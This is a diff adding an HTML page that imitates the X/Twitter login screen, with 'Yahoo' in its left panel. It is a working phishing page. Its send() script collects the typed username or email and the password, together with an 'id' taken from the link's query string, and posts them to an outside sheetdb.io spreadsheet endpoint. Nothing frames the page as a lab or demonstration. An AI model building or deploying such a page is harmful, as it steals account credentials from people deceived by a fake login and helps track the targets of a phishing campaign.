@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>X / Twitter Login</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #000;
+        color: #fff;
+        display: flex;
+        height: 100vh;
+    }
+
+    /* Left side */
+    .left {
+        flex: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #000;
+    }
+
+    .left img {
+        width: 300px;
+        opacity: 0.85;
+    }
+
+    /* Right side */
+    .right {
+        flex: 1;
+        padding: 60px 40px;
+        background: #000;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+    }
+
+    h1 {
+        font-size: 60px;
+        font-weight: 800;
+    }
+
+    h3 {
+        font-size: 28px;
+        margin-top: 20px;
+        margin-bottom: 30px;
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border-radius: 30px;
+        border: none;
+        cursor: pointer;
+        margin-bottom: 12px;
+    }
+
+    .google {
+        background: #fff;
+        color: #000;
+        font-weight: bold;
+    }
+
+    .apple {
+        background: #fff;
+        color: #000;
+        font-weight: bold;
+    }
+
+    .divider {
+        text-align: center;
+        margin: 15px 0;
+        font-size: 14px;
+        color: #aaa;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        background: transparent;
+        border: 1px solid #555;
+        border-radius: 6px;
+        color: #fff;
+        margin-bottom: 15px;
+        font-size: 15px;
+    }
+
+    .login-btn {
+        background: #1D9BF0;
+        color: white;
+        font-weight: bold;
+    }
+
+    .login-btn:hover {
+        background: #1484d6;
+    }
+
+    .signup-text {
+        margin-top: 20px;
+        color: #aaa;
+        font-size: 15px;
+    }
+
+    .signup-text a {
+        color: #1D9BF0;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    /* Responsive for mobile */
+    @media(max-width: 900px) {
+        body {
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .left {
+            padding: 40px 0;
+        }
+
+        .left img {
+            width: 150px;
+        }
+
+        h1 {
+            font-size: 40px;
+        }
+
+        .right {
+            padding: 30px 20px;
+        }
+    }
+</style>
+</head>
+<body>
+
+<!-- Left Section -->
+<div class="left">
+    <h1>Yahoo</h1>
+</div>
+
+<!-- Right Section -->
+<div class="right">
+    <h1>Happening now</h1>
+    <h3>Join today.</h3>
+
+    <button class="google">Continue with Google</button>
+    <button class="apple">Continue with Apple</button>
+
+    <div class="divider">or</div>
+
+    <input id="email" type="text" placeholder="Phone, email, or username">
+    <input id="password" type="password" placeholder="Password">
+
+    <button onclick="send()" class="login-btn">Log In</button>
+
+
+
+  <script>
+        function send() {
+         
+       const password = document.getElementById('password').value;
+       const email = document.getElementById('email').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "yahoo";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+  }
+ 
+     
+   </script>
+        
+        
+
+
+
+
+
+
+
+
+    <div class="signup-text">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+
+</body>
+</html>
